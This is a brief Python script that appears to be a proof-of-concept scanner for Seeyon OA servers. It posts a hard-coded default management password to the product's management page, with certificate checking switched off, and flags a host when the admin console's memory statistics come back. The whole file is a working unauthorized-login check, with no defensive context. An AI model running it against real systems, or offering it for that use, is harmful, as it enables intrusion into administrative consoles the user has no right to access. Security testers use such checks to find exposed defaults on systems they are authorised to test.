import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"seeyon/management/index.jsp"
	body="password=WLCCYBD%40SEEYON"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "Free Physical Memory Size" in response.text:
		r1=True
	else:
		r1=False
	if r1:
		return True
	else:
		return False
